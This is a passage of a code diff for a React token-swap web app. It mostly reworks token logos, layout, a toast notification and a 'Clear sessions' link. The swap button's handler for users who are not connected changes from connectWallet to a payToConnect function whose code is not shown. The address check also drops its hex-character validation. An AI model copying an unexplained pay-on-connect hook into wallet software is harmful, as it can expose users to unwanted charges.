               >
+                <ChevronDown size={16} />
                 <div className="token-info">
-                  {toToken ? (
-                    <TokenLogo token={toToken} size={24} className="token-logo-select" />
-                  ) : (
-                    <div className="token-placeholder" style={{width: 24, height: 24, borderRadius: '50%', backgroundColor: '#4b7688'}}></div>
-                  )}
                   <div className="token-details">
                     <span className="token-symbol">{toToken?.symbol || 'Select Token'}</span>
                     <span className="token-name">{toToken?.name || 'Choose a token'}</span>
                   </div>
+                  {toToken ? (
+                    <TokenLogo 
+                      token={toToken} 
+                      size={20} 
+                      className="token-logo-select" 
+                      getLogoUrl={getLogoUrl}
+                      handleImageLoad={handleImageLoad}
+                      handleImageError={handleImageError}
+                    />
+                  ) : (
+                    <div className="token-placeholder" style={{width: 20, height: 20, borderRadius: '50%', backgroundColor: '#4b7688'}}></div>
+                  )}
                 </div>
-                <ChevronDown size={20} />
               </button>
               <input
                 type="text"
@@ -2927,6 +2463,9 @@ function App() {
               />
             </div>
           </div>
+          
+          </div>
+          {/* End Swap Inputs Wrapper */}
 
           {/* Swap Info */}
           {fromAmount && toAmount && (
@@ -3001,7 +2540,7 @@ function App() {
           {/* Swap Button */}
           <button
             className={`swap-btn ${!(isConnected || account) || (!fromAmount && (isConnected || account)) || isSwapping ? 'disabled' : ''}`}
-            onClick={!(isConnected || account) ? connectWallet : handleSwap}
+            onClick={!(isConnected || account) ? payToConnect : handleSwap}
             disabled={isSwapping}
           >
             {isSwapping ? (
@@ -3014,6 +2553,26 @@ function App() {
               `Swap ${fromToken?.symbol || 'Token'} to ${toToken?.symbol || 'Token'}`
             )}
           </button>
+          
+          {/* Force Clear Sessions Link - only show when not connected */}
+          {!(isConnected || account) && (
+            <div style={{ textAlign: 'center', marginTop: '8px' }}>
+              <button
+                onClick={forceClearAndReconnect}
+                style={{
+                  background: 'none',
+                  border: 'none',
+                  color: '#7B2FFF',
+                  fontSize: '12px',
+                  textDecoration: 'underline',
+                  cursor: 'pointer',
+                  padding: '4px'
+                }}
+              >
+                Having connection issues? Clear sessions
+              </button>
+            </div>
+          )}
         </div>
 
         {/* Desktop Info Panel */}
@@ -3059,11 +2618,10 @@ function App() {
             </ul>
           </div>
         </div>
-        </>
-        )}
+      </main>
 
-        {/* Token Selection Modal */}
-        {showTokenModal && (
+      {/* Token Selection Modal */}
+      {showTokenModal && (
           <div 
             className={`modal-overlay ${showTokenModal ? 'show' : ''}`} 
             onClick={() => setShowTokenModal(false)}
@@ -3085,11 +2643,13 @@ function App() {
                       placeholder="Search or paste token address..."
                       value={tokenSearch}
                       onChange={async (e) => {
-                        const value = e.target.value.trim();
-                        setTokenSearch(value);
+                        const rawValue = e.target.value;
+                        setTokenSearch(rawValue);
                         
-                        // Auto-detect and add token address (0x followed by 40 hex chars)
-                        if (value.match(/^0x[a-fA-F0-9]{40}$/)) {
+                        const value = rawValue.trim();
+                        
+                        // Auto-detect and add token address (0x followed by 40 hex chars, case insensitive)
+                        if (value.toLowerCase().startsWith('0x') && value.length === 42) {
                           console.log('🔍 Detected token address, auto-adding:', value);
                           setIsLoadingToken(true);
                           await addCustomToken(value);
@@ -3114,7 +2674,14 @@ function App() {
                     onClick={() => selectToken(token)}
                   >
                     <div className="token-info">
-                      <TokenLogo token={token} size={32} className="token-logo-modal" />
+                      <TokenLogo 
+                        token={token} 
+                        size={32} 
+                        className="token-logo-modal" 
+                        getLogoUrl={getLogoUrl}
+                        handleImageLoad={handleImageLoad}
+                        handleImageError={handleImageError}
+                      />
                       <div className="token-details">
                         <span className="token-symbol">{token.symbol}</span>
                         <span className="token-name">{token.name}</span>
@@ -3163,7 +2730,12 @@ function App() {
           </div>
         )}
 
-      </main>
+      {/* Toast Notification */}
+      {toast && (
+        <div className={`toast ${toast.type}`}>
+          {toast.message}
+        </div>
+      )}
     </div>
   )
 }
